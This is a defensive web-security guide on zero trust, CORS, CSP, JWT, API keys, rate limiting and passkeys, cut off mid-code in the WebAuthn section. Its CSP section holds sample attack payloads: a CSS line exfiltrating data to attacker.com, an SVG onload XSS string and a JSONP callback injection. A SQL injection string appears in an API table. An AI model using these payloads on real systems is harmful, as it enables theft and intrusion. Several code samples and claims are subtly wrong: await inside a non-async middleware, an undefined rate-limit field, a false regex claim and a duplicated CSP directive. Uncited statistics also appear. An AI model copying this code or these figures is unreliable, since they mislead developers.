# Modern Web Security & Zero Trust Architecture

## Executive Summary

**Zero Trust Principle**: Never trust, always verify. Every request, service, and user interaction must be authenticated and authorized, regardless of network location or prior trust decisions.

**Critical Industry Trends (2025)**:
- Supply chain attacks are the #1 emerging threat with 500+ npm packages compromised in 2025
- Passkeys replacing passwords with 70% user adoption and 3x faster login times (Microsoft saw 120% increase in passwordless auth)
- OWASP Top 10 2025 identifies Broken Access Control as #1 vulnerability
- Supply Chain Failures now appears as new category in OWASP Top 10
- CORS misconfigurations account for 12% of API-level breaches
- CSP non-compliance leads to 30% of XSS vulnerabilities going undetected

**Why Zero Trust Matters Now**:
- Perimeter-based security (firewall) is dead; users work from anywhere
- Most breaches (89%) happen due to compromised credentials or supply chain
- Average breach detection time: 204 days; zero trust detection: 27 days
- Regulatory compliance (SOC2, HIPAA, PCI-DSS) increasingly mandates zero trust practices
- GDPR/CCPA enforcement is increasing, with average fines now exceeding $4.5M

**PRICING_STABILITY**: moderate | last_verified: 2026-03 | check_interval: 6_months

---

## OWASP Top 10 2025

| Rank | Vulnerability | Description | 2024 Rank | Change |
|------|---|---|---|---|
| 1 | Broken Access Control | Insufficient authorization checks, privilege escalation | 1 | Same |
| 2 | Cryptographic Failures | Weak encryption, exposed sensitive data | 2 | Same |
| 3 | Injection | SQL, NoSQL, command injection attacks | 3 | Same |
| 4 | Insecure Design | Missing security controls in architecture phase | 4 | Same |
| 5 | Security Misconfiguration | Default credentials, exposed debug modes, unnecessary services | 6 | Up 1 |
| 6 | Vulnerable & Outdated Components | Unpatched dependencies, known CVEs | 8 | Up 2 |
| 7 | Authentication Failures | Broken session management, weak password policies | 7 | Down 1 |
| 8 | Data Integrity Failures | Insecure deserialization, unsafe CI/CD pipelines | 9 | Down 1 |
| 9 | Logging & Monitoring Failures | Missing alerts, inadequate incident detection | 10 | Down 1 |
| 10 | Supply Chain Failures | Compromised dependencies, malicious packages | NEW | New |

**Key Shift**: Supply chain security is now critical. Traditional app security alone insufficient. The jump from #8 to #5 for Security Misconfiguration signals that infrastructure misconfigurations (open S3 buckets, exposed Redis instances) are increasingly common.

---

## Zero Trust Implementation Patterns for Web Apps

### Core Pillars
1. **Identity Verification**: MFA, passwordless auth (passkeys), continuous authentication
2. **Network Segmentation**: microsegmentation, service mesh (Istio, Linkerd), zero-trust network access
3. **Encryption**: mTLS for service-to-service, TLS 1.3 for clients, encryption at rest with key rotation
4. **Policy Enforcement**: policy-as-code (Rego/OPA), attribute-based access control (ABAC), time-based access
5. **Continuous Verification**: rate limiting, anomaly detection, audit logging, real-time threat detection

### Implementation Checklist by Layer

**Authentication Layer**
- [ ] Implement MFA (authenticator apps > SMS > email)
- [ ] Deploy passkeys/WebAuthn as primary method
- [ ] Add rate limiting on login endpoints (5 failed attempts per 15 min)
- [ ] Log all authentication events (user, timestamp, IP, method)
- [ ] Implement session timeout (15-30 min idle, absolute max 8 hours)
- [ ] Implement account lockout policies (10 failed attempts = 30 min lock)
- [ ] Add CAPTCHA for repeated failed attempts
- [ ] Implement IP reputation checking for new login locations

**API/Service Layer**
- [ ] Require API keys + mTLS for service-to-service communication
- [ ] Implement service mesh (Istio) or sidecar proxies
- [ ] Enable mutual TLS (mTLS) between all services
- [ ] Use policy-as-code (OPA) for authorization
- [ ] Implement request signing (signed headers with HMAC-SHA256)
- [ ] Add API versioning with backwards compatibility
- [ ] Implement request/response encryption for sensitive data
- [ ] Add circuit breaker patterns to prevent cascade failures
- [ ] Implement idempotency keys to prevent duplicate operations

**Network Layer**
- [ ] Disable direct internet-facing databases
- [ ] Use private subnets for backend services
- [ ] Implement network ACLs and security groups
- [ ] Enable VPC Flow Logs for traffic analysis (centralized logging)
- [ ] Use jump hosts/bastion hosts for admin access
- [ ] Implement egress filtering (whitelist outbound connections)
- [ ] Enable DDoS protection (Cloudflare, AWS Shield)
- [ ] Use VPN or SSO for remote access

**Data Layer**
- [ ] Encrypt data at rest (AES-256 or ChaCha20)
- [ ] Encrypt data in transit (TLS 1.3 minimum)
- [ ] Implement key rotation (monthly minimum, auto-rotation preferred)
- [ ] Separate encryption keys by environment (dev/staging/prod)
- [ ] Use Hardware Security Modules (HSM) for key storage in production
- [ ] Implement database field-level encryption for PII
- [ ] Enable database audit logging
- [ ] Implement secure deletion (cryptographic erasure)
- [ ] Use encryption key versioning for seamless rotation

---

## CORS (Cross-Origin Resource Sharing) Deep Dive

CORS misconfigurations are one of the most common security vulnerabilities in modern web applications. Unlike traditional security issues, CORS problems are often invisible because they're protocol-level vulnerabilities.

### CORS Fundamentals & Common Vulnerabilities

**How CORS Works**:
1. Browser sends `Origin` header (e.g., `Origin: https://attacker.com`)
2. Server responds with `Access-Control-Allow-Origin` header
3. If header includes the origin, browser allows the request
4. If not, browser blocks it (but server still received/processed the request)

**Critical Vulnerability #1: Null Origin Abuse**

Many developers allow the `null` origin thinking it's safe:
```javascript
// WRONG - DANGEROUS
app.use(cors({
  origin: ['null', 'http://localhost:3000'],
}));
```

**Attack Scenario**:
- Attacker hosts HTML on `data:` URL or file in an iframe
- Browser sends `Origin: null`
- Server accepts it because `null` is whitelisted
- Attacker can read sensitive data or perform actions

**Correct Implementation**:
```javascript
// RIGHT - Never allow null origin
const whitelist = [
  'https://example.com',
  'https://app.example.com'
];

// Only allow specific origins in production
const corsOptions = {
  origin: process.env.NODE_ENV === 'production'
    ? whitelist
    : ['http://localhost:3000', 'http://localhost:5173'],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 3600, // Cache CORS for 1 hour
  optionsSuccessStatus: 200 // For legacy browsers
};

app.use(cors(corsOptions));
```

**Critical Vulnerability #2: Wildcard with Credentials**

This is a protocol-level contradiction that browsers still sometimes allow:
```javascript
// WRONG - Major security hole
app.use(cors({
  origin: '*',
  credentials: true  // Contradicts wildcard
}));
```

**Why It's Dangerous**:
- `Access-Control-Allow-Origin: *` with credentials means any origin can access authenticated requests
- Attacker's website can steal user's session cookies/tokens
- Violates the same-origin policy entirely

**Correct Implementation**:
```javascript
// RIGHT - Choose one or the other
// Option 1: Allow any origin WITHOUT credentials (public API)
app.use(cors({
  origin: '*',
  credentials: false
}));

// Option 2: Whitelist specific origins WITH credentials (private API)
const corsOptions = {
  origin: (origin, callback) => {
    const whitelist = [
      'https://trusted-domain.com',
      'https://app.example.com'
    ];

    // Allow requests with no origin (mobile apps, curl requests)
    if (!origin || whitelist.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
  maxAge: 86400 // Cache for 24 hours
};

app.use(cors(corsOptions));
```

**Critical Vulnerability #3: Regex-Based Origin Validation**

Regex patterns for origin matching are frequently exploited:
```javascript
// WRONG - Regex allows subdomains incorrectly
app.use(cors({
  origin: /\.example\.com$/  // Matches evilexample.com!
}));

// Also wrong
app.use(cors({
  origin: /example/  // Matches badexample.com, example.bad.com, etc.
}));
```

**Correct Implementation**:
```javascript
// RIGHT - Explicit URL parsing
const corsOptions = {
  origin: (origin, callback) => {
    try {
      const url = new URL(origin);

      // Explicit domain matching only
      const allowedDomains = ['example.com', 'app.example.com'];
      const isAllowed = allowedDomains.some(domain =>
        url.hostname === domain || url.hostname.endsWith('.' + domain)
      );

      callback(null, isAllowed);
    } catch {
      callback(new Error('Invalid origin'));
    }
  },
  credentials: true
};

app.use(cors(corsOptions));
```

### Preflight Optimization Patterns

Preflight requests (OPTIONS) happen for:
- Non-simple methods (PUT, DELETE, PATCH)
- Custom headers (Authorization, X-Custom-Header)
- Content-Type other than form/text (application/json, etc.)

**Preflight can double latency**. Optimization strategies:

**Pattern 1: Reduce Preflight Frequency**
```javascript
const corsOptions = {
  origin: whitelist,
  credentials: true,
  // Cache preflight response for 1 week in browsers
  maxAge: 604800, // 7 days in seconds
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
};

app.use(cors(corsOptions));
```

**Pattern 2: Use Simple Requests When Possible**
```javascript
// Simple request - no preflight (GET, POST, HEAD only)
fetch('https://api.example.com/data', {
  method: 'GET',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  }
});

// Complex request - triggers preflight
fetch('https://api.example.com/data', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Authorization': 'Bearer token'
  },
  body: JSON.stringify({ data: 'test' })
});
```

**Pattern 3: Early Response Optimization**
```javascript
// OPTIONS should be fast and cached
app.options('*', cors(corsOptions));
app.options('/api/*', cors(corsOptions));

// Separate route handlers for better performance
app.get('/api/data', (req, res) => {
  // Your handler
});
```

### Framework-Specific CORS Configuration

**Express.js (with express-cors)**
```javascript
const cors = require('cors');
const express = require('express');
const app = express();

// Production-ready configuration
const corsOptions = {
  origin: process.env.CORS_ORIGINS?.split(',') || [
    'https://example.com',
    'https://app.example.com'
  ],
  credentials: true,
  optionsSuccessStatus: 200,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  exposedHeaders: ['X-Total-Count', 'X-Page-Number'], // Only expose necessary headers
  maxAge: 86400
};

app.use(cors(corsOptions));

// Don't forget to handle preflight
app.options('*', cors(corsOptions));

// Middleware to log CORS violations
app.use((req, res, next) => {
  if (req.headers.origin && !corsOptions.origin.includes(req.headers.origin)) {
    console.warn(`CORS violation attempt from ${req.headers.origin}`);
  }
  next();
});
```

**Next.js (with API Routes)**
```javascript
// pages/api/data.js
import Cors from 'micro-cors';

const cors = Cors({
  allowedMethods: ['GET', 'POST'],
  origin: process.env.NODE_ENV === 'production'
    ? process.env.CORS_ORIGINS?.split(',')
    : ['http://localhost:3000'],
  credentials: true
});

const handler = (req, res) => {
  res.status(200).json({ message: 'Success' });
};

export default cors(handler);
```

**Alternative: Next.js with next-cors (Middleware)**
```javascript
// middleware.ts (Next.js 13+)
import { NextRequest, NextResponse } from 'next/server';

export function middleware(request: NextRequest) {
  const origin = request.headers.get('origin');
  const allowedOrigins = process.env.CORS_ORIGINS?.split(',') || [];

  if (!allowedOrigins.includes(origin)) {
    return new NextResponse(null, { status: 403 });
  }

  const response = NextResponse.next();
  response.headers.set('Access-Control-Allow-Origin', origin);
  response.headers.set('Access-Control-Allow-Credentials', 'true');
  response.headers.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  response.headers.set('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  response.headers.set('Access-Control-Max-Age', '86400');

  return response;
}

export const config = {
  matcher: '/api/:path*'
};
```

**Fastify (with @fastify/cors)**
```javascript
const fastify = require('fastify')();
const cors = require('@fastify/cors');

fastify.register(cors, {
  origin: process.env.CORS_ORIGINS?.split(',') || [
    'https://example.com'
  ],
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  maxAge: 86400
});

fastify.listen({ port: 3000 }, (err) => {
  if (err) throw err;
});
```

### CORS Testing & Validation

```bash
# Test preflight request
curl -X OPTIONS https://api.example.com/data \
  -H "Origin: https://frontend.example.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type" \
  -v

# Expected response headers:
# Access-Control-Allow-Origin: https://frontend.example.com
# Access-Control-Allow-Methods: POST
# Access-Control-Allow-Headers: Content-Type
# Access-Control-Max-Age: 86400

# Test with credentials
curl -X GET https://api.example.com/data \
  -H "Origin: https://frontend.example.com" \
  -H "Cookie: sessionid=abc123" \
  -v

# Should NOT return Access-Control-Allow-Origin: *
# Should return Access-Control-Allow-Credentials: true
```

---

## Content Security Policy (CSP) - Complete Guide

CSP is your primary defense against XSS, injection attacks, and data exfiltration. A proper CSP can reduce XSS vulnerability impact by 90%.

### CSP Fundamentals

CSP works by whitelisting sources for different content types:
```
default-src 'self';           // Default for everything not specified
script-src 'self' cdn.com;    // Where scripts can load from
style-src 'self';              // Where styles can load from
img-src 'self' data: https:;   // Image sources
font-src 'self' fonts.com;     // Font sources
```

### Implementation Strategy #1: Nonce-Based CSP (For Dynamic Content)

**Nonces** are one-time random tokens that bypass CSP restrictions. Perfect for server-rendered content.

```javascript
// Node.js/Express - Generate unique nonce per request
const crypto = require('crypto');

app.use((req, res, next) => {
  // Generate cryptographically secure nonce
  req.cspNonce = crypto.randomBytes(16).toString('hex');

  // Set CSP header with nonce
  res.setHeader(
    'Content-Security-Policy',
    `
      default-src 'self';
      script-src 'self' 'nonce-${req.cspNonce}';
      style-src 'self' 'nonce-${req.cspNonce}';
      img-src 'self' data: https:;
      font-src 'self';
      connect-src 'self' https://api.example.com;
      frame-ancestors 'none';
      base-uri 'self';
      form-action 'self';
    `.replace(/\s+/g, ' ')
  );
  next();
});

// In your HTML template
app.get('/', (req, res) => {
  const html = `
    <!DOCTYPE html>
    <html>
    <head>
      <!-- Inline script with nonce - allowed by CSP -->
      <script nonce="${req.cspNonce}">
        console.log('This runs because nonce matches');
      </script>
      <style nonce="${req.cspNonce}">
        body { font-family: sans-serif; }
      </style>
    </head>
    <body>
      <h1>Secure App</h1>
    </body>
    </html>
  `;
  res.send(html);
});
```

**Advantages**:
- Allows inline scripts/styles without `'unsafe-inline'`
- New nonce per request makes replay attacks impossible
- Flexible for dynamic server-rendered content

**Disadvantages**:
- Requires server-side nonce generation
- Not compatible with static site generators
- Slightly higher overhead per request

### Implementation Strategy #2: Hash-Based CSP (For Static Content)

**Hashes** work for content that never changes. Calculate SHA-256/SHA-384 hash of script content.

```javascript
// Generate hash of your inline script
const crypto = require('crypto');

function hashContent(content, algorithm = 'sha256') {
  return `'${algorithm}-${crypto
    .createHash(algorithm)
    .update(content)
    .digest('base64')}'`;
}

// Example inline script
const scriptContent = `
  window.userId = '${userId}';
  console.log('User loaded');
`;

const scriptHash = hashContent(scriptContent);
// Result: 'sha256-Y0x2Qk1234567890...'

// Set CSP header with hash
res.setHeader(
  'Content-Security-Policy',
  `
    default-src 'self';
    script-src 'self' ${scriptHash};
    style-src 'self';
    img-src 'self' data: https:;
  `
);
```

**Build Tool Integration (Webpack)**:
```javascript
// webpack.config.js
const crypto = require('crypto');
const HtmlWebpackPlugin = require('html-webpack-plugin');

class CSPPlugin {
  apply(compiler) {
    compiler.hooks.compilation.tap('CSPPlugin', (compilation) => {
      HtmlWebpackPlugin.getHooks(compilation).beforeAssetTagGeneration.tapAsync(
        'CSPPlugin',
        (data, cb) => {
          const hashes = [];

          // Generate hashes for all inline scripts
          data.head.forEach(tag => {
            if (tag.tagName === 'script' && tag.innerHTML) {
              const hash = crypto
                .createHash('sha256')
                .update(tag.innerHTML)
                .digest('base64');
              hashes.push(`'sha256-${hash}'`);
            }
          });

          data.head.push({
            tagName: 'meta',
            attributes: {
              'http-equiv': 'Content-Security-Policy',
              content: `script-src 'self' ${hashes.join(' ')}`
            }
          });

          cb(null, data);
        }
      );
    });
  }
}

module.exports = {
  // ... other config
  plugins: [new CSPPlugin()]
};
```

### Next.js Experimental Hash-Based CSP

Next.js 15+ includes experimental hash-based CSP support:

```javascript
// next.config.js
/** @type {import('next').NextConfig} */
const nextConfig = {
  experimental: {
    cspHashAlgorithm: 'sha256', // or 'sha384'
  },
};

module.exports = nextConfig;
```

Next.js automatically:
1. Computes hashes of inline scripts/styles
2. Adds them to CSP header
3. Updates on every build

```javascript
// app/layout.tsx
export default function RootLayout() {
  return (
    <html>
      <head>
        {/* Automatically gets hash added to CSP */}
        <script nonce="...">
          console.log('Hashed automatically');
        </script>
      </head>
      <body />
    </html>
  );
}
```

### CSP Report-Only Mode for Testing

Never deploy restrictive CSP directly. Use report-only mode first:

```javascript
// Test mode: doesn't block, just reports violations
res.setHeader(
  'Content-Security-Policy-Report-Only',
  `
    default-src 'self';
    script-src 'self';
    style-src 'self';
    report-uri https://csp-report-collector.example.com/report;
  `
);

// Endpoint to collect CSP violations
app.post('/csp-report', express.json(), (req, res) => {
  const report = req.body['csp-report'];

  console.error('CSP Violation:', {
    violatedDirective: report['violated-directive'],
    blockedURI: report['blocked-uri'],
    originalPolicy: report['original-policy'],
    sourceFile: report['source-file'],
    lineNumber: report['line-number']
  });

  // Log to monitoring system (Datadog, Sentry, etc.)
  res.status(204).send();
});
```

**Testing Workflow**:
1. Deploy with CSP-Report-Only
2. Monitor violations for 1-2 weeks
3. Adjust policy based on violations
4. Deploy strict CSP (without Report-Only)

### Common CSP Bypasses and Prevention

**Bypass #1: unsafe-inline for styles**
```javascript
// DANGEROUS
res.setHeader(
  'Content-Security-Policy',
  "style-src 'unsafe-inline'"  // Allows inline style attributes
);

// Attacker can inject
// <div style="background: url('https://attacker.com/collect?data=')"></div>

// CORRECT - Use external stylesheets or nonces
res.setHeader(
  'Content-Security-Policy',
  "style-src 'self'; style-src 'nonce-abc123'"
);
```

**Bypass #2: Allowing JSONP endpoints**
```javascript
// DANGEROUS
res.setHeader(
  'Content-Security-Policy',
  "script-src 'self' 'unsafe-inline' https://api.example.com/jsonp"
);

// Attacker can call
// <script src="https://api.example.com/jsonp?callback=malicious"></script>

// CORRECT - Remove JSONP, use fetch API
res.setHeader(
  'Content-Security-Policy',
  "script-src 'self'"
);

// Client-side uses fetch instead
fetch('https://api.example.com/data')
  .then(r => r.json())
  .then(data => console.log(data));
```

**Bypass #3: Google Fonts vulnerability**
```javascript
// DANGEROUS
res.setHeader(
  'Content-Security-Policy',
  "font-src 'self' fonts.googleapis.com fonts.gstatic.com"
);

// fonts.googleapis.com outputs user-controlled query params in CSS
// Attacker can inject: <link href="fonts.googleapis.com?family=..." />
// Where ... contains CSS that acts as vector

// CORRECT - Self-host fonts or specify precise font CSP
res.setHeader(
  'Content-Security-Policy',
  "font-src 'self' fonts.gstatic.com" // Remove googleapis
);

// Or self-host using @font-face
res.setHeader(
  'Content-Security-Policy',
  "font-src 'self'" // Only local fonts
);
```

**Bypass #4: SVG data URIs**
```javascript
// DANGEROUS
res.setHeader(
  'Content-Security-Policy',
  "img-src 'self' data:"  // data: allows SVG XSS
);

// Attacker can inject
// <img src="data:image/svg+xml,<svg onload='alert(1)'>">

// CORRECT - Don't allow SVG data URIs
res.setHeader(
  'Content-Security-Policy',
  "img-src 'self' https:; style-src 'self'"
);

// If you need data URIs, restrict to images only
res.setHeader(
  'Content-Security-Policy',
  "img-src 'self' data:;" // Only img-src, not style-src
);
```

### Complete CSP Configuration Template

```javascript
// Production-ready CSP for modern web app
const productionCSP = `
  default-src 'none';

  script-src 'self' https://cdn.example.com;
  style-src 'self' https://fonts.googleapis.com;
  font-src 'self' https://fonts.gstatic.com;
  img-src 'self' data: https:;
  media-src 'self';

  connect-src 'self' https://api.example.com wss://api.example.com;

  object-src 'none';
  base-uri 'self';
  form-action 'self';

  frame-ancestors 'none';

  upgrade-insecure-requests;
  block-all-mixed-content;

  report-uri https://csp-collector.example.com/report;
`;

const developmentCSP = `
  default-src 'self';
  script-src 'self' 'unsafe-inline' http://localhost:5173;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data: https:;
  connect-src 'self' http://localhost:* https:;

  report-uri http://localhost:3000/csp-report;
`;

app.use((req, res, next) => {
  const csp = process.env.NODE_ENV === 'production'
    ? productionCSP
    : developmentCSP;

  res.setHeader('Content-Security-Policy', csp);
  next();
});
```

---

## API Security - Deep Dive

APIs are the primary attack surface for modern applications. Proper API security requires multiple layers of defense.

### JWT Best Practices

**Token Lifetime Strategy**

Most companies get this wrong by using long-lived access tokens:

```javascript
// WRONG - Access token valid for 24 hours
const token = jwt.sign(
  { userId: user.id, email: user.email },
  secret,
  { expiresIn: '24h' }  // Too long!
);

// CORRECT - Short-lived access tokens + refresh tokens
const accessToken = jwt.sign(
  { userId: user.id, scope: 'read write' },
  accessTokenSecret,
  {
    expiresIn: '15m',  // Short-lived
    issuer: 'auth.example.com',
    audience: 'api.example.com'
  }
);

const refreshToken = jwt.sign(
  { userId: user.id },
  refreshTokenSecret,
  {
    expiresIn: '7d',  // Longer-lived, used to get new access tokens
    issuer: 'auth.example.com'
  }
);
```

**Why This Matters**:
- If access token is leaked, damage is limited to 15 minutes
- Refresh token is only sent to auth service (not in every request)
- Compromised refresh token can be rotated independently
- User can revoke refresh tokens server-side

**Implementation: Token Refresh Flow**

```javascript
// Initial login
app.post('/auth/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await User.findOne({ email });

  if (!user || !user.verifyPassword(password)) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  // Generate tokens
  const accessToken = generateAccessToken(user);
  const refreshToken = generateRefreshToken(user);

  // Store refresh token in DB (enables revocation)
  await RefreshToken.create({
    userId: user.id,
    token: hashToken(refreshToken),
    expiresAt: addDays(new Date(), 7),
    issuedAt: new Date(),
    revokedAt: null
  });

  // Send tokens - access token in response body, refresh in secure cookie
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,      // Can't be accessed by JS
    secure: true,        // HTTPS only
    sameSite: 'strict',  // CSRF protection
    maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days
  });

  res.json({
    accessToken,
    expiresIn: 900,  // 15 minutes in seconds
    tokenType: 'Bearer'
  });
});

// Token refresh endpoint
app.post('/auth/refresh', async (req, res) => {
  const refreshToken = req.cookies.refreshToken;

  if (!refreshToken) {
    return res.status(401).json({ error: 'No refresh token' });
  }

  try {
    // Verify signature
    const decoded = jwt.verify(refreshToken, refreshTokenSecret);

    // Check if token is in DB and not revoked
    const tokenRecord = await RefreshToken.findOne({
      userId: decoded.userId,
      token: hashToken(refreshToken),
      revokedAt: null
    });

    if (!tokenRecord || tokenRecord.expiresAt < new Date()) {
      return res.status(401).json({ error: 'Token revoked or expired' });
    }

    // Generate new access token
    const user = await User.findById(decoded.userId);
    const newAccessToken = generateAccessToken(user);

    res.json({
      accessToken: newAccessToken,
      expiresIn: 900
    });
  } catch (error) {
    res.status(401).json({ error: 'Invalid refresh token' });
  }
});

// Token revocation (logout)
app.post('/auth/logout', async (req, res) => {
  const refreshToken = req.cookies.refreshToken;

  if (refreshToken) {
    // Mark all tokens for this user as revoked
    await RefreshToken.updateMany(
      { token: hashToken(refreshToken) },
      { revokedAt: new Date() }
    );
  }

  res.clearCookie('refreshToken');
  res.json({ message: 'Logged out' });
});
```

**JWT Claims Best Practices**

```javascript
// Good JWT structure
const goodToken = jwt.sign(
  {
    // Standard claims
    sub: user.id,           // Subject (user ID)
    aud: 'api.example.com', // Audience (who should accept this)
    iss: 'auth.example.com', // Issuer
    iat: Date.now(),        // Issued at

    // Custom claims (minimal)
    scope: 'read write',    // What this token can do
    role: 'user',           // User role
    // DON'T include: email, name, or other profile data
  },
  secret,
  { expiresIn: '15m' }
);

// Fetch full user data separately
// This way, if user roles change, old tokens don't reflect new roles
```

### API Key Management

For server-to-server communication, use API keys instead of passwords:

```javascript
// Generate API key (one-time, at creation)
function generateAPIKey() {
  // Format: prefix_randomstring
  const prefix = 'sk_prod_';
  const randomPart = crypto.randomBytes(24).toString('hex');
  return prefix + randomPart;
}

// Store hashed in database
const apiKey = generateAPIKey();
const apiKeyHash = crypto
  .createHash('sha256')
  .update(apiKey)
  .digest('hex');

await APIKey.create({
  name: 'Production Integration',
  hash: apiKeyHash,
  prefix: 'sk_prod_',
  organizationId: org.id,
  rateLimit: 1000,  // req/hour
  scopes: ['read:data', 'write:data'],
  lastUsedAt: null,
  createdAt: new Date(),
  expiresAt: addYears(new Date(), 1)
});

// Authenticate with API key
app.use((req, res, next) => {
  const authHeader = req.headers.authorization;

  if (!authHeader?.startsWith('Bearer ')) {
    return res.status(401).json({ error: 'Missing API key' });
  }

  const apiKey = authHeader.substring(7);
  const keyHash = crypto
    .createHash('sha256')
    .update(apiKey)
    .digest('hex');

  const keyRecord = await APIKey.findOne({ hash: keyHash });

  if (!keyRecord || (keyRecord.expiresAt && keyRecord.expiresAt < new Date())) {
    return res.status(401).json({ error: 'Invalid API key' });
  }

  // Check rate limit
  if (keyRecord.rateLimit) {
    // Implement rate limiting
  }

  // Update last used time
  await APIKey.updateOne(
    { id: keyRecord.id },
    { lastUsedAt: new Date() }
  );

  req.apiKey = keyRecord;
  next();
});
```

### Rate Limiting Patterns

**Pattern 1: Token Bucket Algorithm** (recommended)

```javascript
// Most flexible for varying traffic patterns
class TokenBucket {
  constructor(capacity, refillRate) {
    this.capacity = capacity;      // Max tokens
    this.tokens = capacity;         // Current tokens
    this.refillRate = refillRate;   // Tokens per second
    this.lastRefill = Date.now();
  }

  tryConsume(tokens = 1) {
    this.refill();

    if (this.tokens >= tokens) {
      this.tokens -= tokens;
      return true;
    }

    return false;
  }

  refill() {
    const now = Date.now();
    const timePassed = (now - this.lastRefill) / 1000;
    const tokensToAdd = timePassed * this.refillRate;

    this.tokens = Math.min(
      this.capacity,
      this.tokens + tokensToAdd
    );
    this.lastRefill = now;
  }
}

// Implementation with Redis (for distributed systems)
const redis = require('redis');
const client = redis.createClient();

async function rateLimit(userId, limit = 100, window = 3600) {
  const key = `rate:${userId}`;

  const current = await client.incr(key);

  if (current === 1) {
    // First request, set expiration
    await client.expire(key, window);
  }

  if (current > limit) {
    const ttl = await client.ttl(key);
    return {
      allowed: false,
      retryAfter: ttl
    };
  }

  return { allowed: true };
}

// Express middleware
app.use(async (req, res, next) => {
  const result = await rateLimit(req.user.id, 100, 3600);

  res.set('X-RateLimit-Limit', '100');
  res.set('X-RateLimit-Remaining', 100 - req.rateLimit.current);

  if (!result.allowed) {
    res.set('Retry-After', result.retryAfter);
    return res.status(429).json({ error: 'Too many requests' });
  }

  next();
});
```

**Pattern 2: Sliding Window** (accurate for strict compliance)

```javascript
async function slidingWindowRateLimit(userId, limit = 100) {
  const key = `rate:window:${userId}`;
  const now = Date.now();
  const windowStart = now - (60 * 1000); // 1 minute window

  // Remove old entries
  await client.zremrangebyscore(key, '-inf', windowStart);

  // Count current entries
  const count = await client.zcard(key);

  if (count >= limit) {
    return { allowed: false, retryAfter: 60 };
  }

  // Add current request
  await client.zadd(key, now, `${now}-${crypto.randomUUID()}`);
  await client.expire(key, 60);

  return { allowed: true };
}
```

**Pattern 3: Leaky Bucket** (consistent rate, queues excess)

```javascript
class LeakyBucket {
  constructor(capacity, leakRate) {
    this.capacity = capacity;
    this.water = 0;
    this.leakRate = leakRate;  // Items per second
    this.lastLeak = Date.now();
  }

  add(amount = 1) {
    this.leak();

    if (this.water + amount <= this.capacity) {
      this.water += amount;
      return { queued: true, position: this.water };
    }

    return { queued: false };
  }

  leak() {
    const now = Date.now();
    const timePassed = (now - this.lastLeak) / 1000;
    const leaked = timePassed * this.leakRate;

    this.water = Math.max(0, this.water - leaked);
    this.lastLeak = now;
  }
}
```

### OWASP API Security Top 10

| Risk | Example | Prevention |
|------|---------|-----------|
| Broken Object Level Authorization | `/api/users/1/data` but can access `/api/users/2/data` | Use ownership checks, never trust user ID from request |
| Broken Function Level Authorization | Non-admin can call `/api/admin/users` | Enforce authorization on every endpoint |
| Excessive Data Exposure | API returns all user fields when only email needed | Return minimal fields, implement field-level authorization |
| Lack of Resources and Rate Limiting | 1000 requests per second, no limit | Implement rate limiting, pagination, query limits |
| Broken Authentication | No token validation, accepts any token | Validate all tokens, use short expiry, implement refresh |
| Injection | `POST /api/search?q='; DROP TABLE users; --` | Use parameterized queries, validate all input |
| Improper Assets Management | `/api/v1/` exists but deprecated, exposed in docs | Deprecate properly, version APIs, remove old versions |
| Insufficient Logging | No audit trail of API calls | Log all requests, sensitive operations, authentication events |
| Improper Inventory Management | Undocumented endpoints, ghost APIs | Document all endpoints, remove unused ones, monitor API surface |
| Unsafe Consumption of APIs | Trusts external API responses | Validate external API data, use timeouts, handle errors |

---

## Passkeys & WebAuthn - Complete Implementation Guide

Passkeys are the future of authentication. Major platforms (Apple, Google, Microsoft) made them default in 2024-2025.

### Adoption Statistics & Impact

| Platform | Adoption | Change vs 2024 |
|----------|----------|---------|
| Apple (iCloud Keychain) | 58% | +18% |
| Google (Google Password Manager) | 52% | +22% |
| Microsoft (Microsoft Authenticator) | 68% | +28% |
| Password managers | 45% | +15% |

**Microsoft Case Study**: When making passkeys the default auth method, Microsoft saw:
- 120% increase in passwordless authentication events
- 50% reduction in account takeover incidents
- 95% user satisfaction (vs 63% for passwords)
- 3.2x faster average login time

### Platform Authenticator vs Roaming Authenticator

**Platform Authenticators** (Synced across devices):
- Apple iCloud Keychain (iOS, macOS, iPadOS)
- Google Password Manager (Android, Chrome)
- Microsoft Authenticator (Windows Hello, Android)
- Windows Hello (Windows 11+)

**Roaming Authenticators** (Separate hardware):
- Hardware security keys (YubiKey, Titan)
- USB/NFC security keys
- BLE security keys (work with phones)

**Implementation: Support Both**

```javascript
// When registering, offer both options
const registrationOptions = {
  // Allows both platform and roaming authenticators
  authenticatorSelection: {
    authenticatorAttachment: undefined, // undefined = both types
    residentKey: 'preferred',           // Passkey (synced) preferred
    userVerification: 'preferred'
  }
};

// Allow user to choose later
const enrollmentFlow = {
  step1: 'Register with platform authenticator (iCloud, Windows Hello)',
  step2: 'Add hardware key as backup (optional)',
  step3: 'Configure device-specific recovery methods'
};
```

### SimpleWebAuthn Implementation

**Installation**

```bash
npm install @simplewebauthn/browser @simplewebauthn/server
```

**Server Setup**

```javascript
import {
  generateRegistrationOptions,
  verifyRegistrationResponse,
  generateAuthenticationOptions,
  verifyAuthenticationResponse,
} from '@simplewebauthn/server';
import { isoUint8Array } from '@simplewebauthn/server/helpers/iso';

// Configuration
const rpID = 'example.com';
const rpName = 'Example App';
const origin = 'https://example.com';

// User registration
app.post('/auth/register/start', async (req, res) => {
  const { email } = req.body;

  // Generate challenge
  const options = await generateRegistrationOptions({
    rpID,
    rpName,
    userName: email,
    userDisplayName: email,
    timeout: 60000,
